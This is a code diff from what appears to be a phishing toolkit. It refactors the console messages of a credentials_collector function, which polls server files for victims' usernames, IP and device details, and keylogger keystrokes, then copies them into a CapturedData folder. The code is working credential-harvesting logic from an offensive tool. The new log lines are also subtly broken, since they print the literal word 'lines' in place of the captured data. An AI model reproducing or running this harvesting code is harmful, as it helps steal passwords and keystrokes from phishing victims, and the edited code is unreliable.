@@ -92,12 +92,12 @@ def module_loading_message(module):  # This one just show text..
 
 def credentials_collector(port):
 
-    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n".format(default_palette[0], default_palette[2], default_palette[4]))
+    print(localization.lang_credentials_collector["waiting_for_interaction"])
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                log_writer('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(default_palette[2], default_palette[3], lines))
+                log_writer(localization.lang_credentials_collector["credentials_found"] + "{0}lines{1}".format(default_palette[2], default_palette[3]))
                 #run_command("touch Server/CapturedData/usernames.txt 
                 pathlib_Path("Server/CapturedData/usernames.txt").touch(mode=0o777, exist_ok=True)
                 
@@ -118,7 +118,7 @@ def credentials_collector(port):
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                log_writer('\n {0}[{1} DEVICE DETAILS FOUND {0}]{1}:\n {0}{2}{1}'.format(default_palette[2], default_palette[3], lines))
+                log_writer(localization.lang_credentials_collector["device_details_found"] + "{0}lines{1}".format(default_palette[2], default_palette[3]))
                 #run_command('touch Server/CapturedData/ip.txt 
                 pathlib_Path("Server/CapturedData/ip.txt").touch(mode=0o777, exist_ok=True)
                 # && cat Server/www/ip.txt >> Server/CapturedData/ip.txt 
@@ -141,8 +141,8 @@ def credentials_collector(port):
         with open('Server/www/KeyloggerData.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                log_writer('{0}...............................'.format(default_palette[0]))
-                log_writer(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(default_palette[3], default_palette[2], lines))
+                log_writer(global_localization.line_of_dots)
+                log_writer(localization.lang_credentials_collector["getting_pressed_keys"] + "{0}lines{1}".format(default_palette[2], default_palette[3]))
                 #run_command('touch Server/CapturedData/KeyloggerData.txt 
                 pathlib_Path('Server/CapturedData/KeyloggerData.txt').touch(mode=0o777, exist_ok=True)
                 # && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt
@@ -159,7 +159,7 @@ def credentials_collector(port):
                 new_keys.write('')
                 new_keys.close()
 
-                log_writer('{0}...............................'.format(default_palette[0]))
+                log_writer(global_localization.line_of_dots)
 
         creds.close()
 
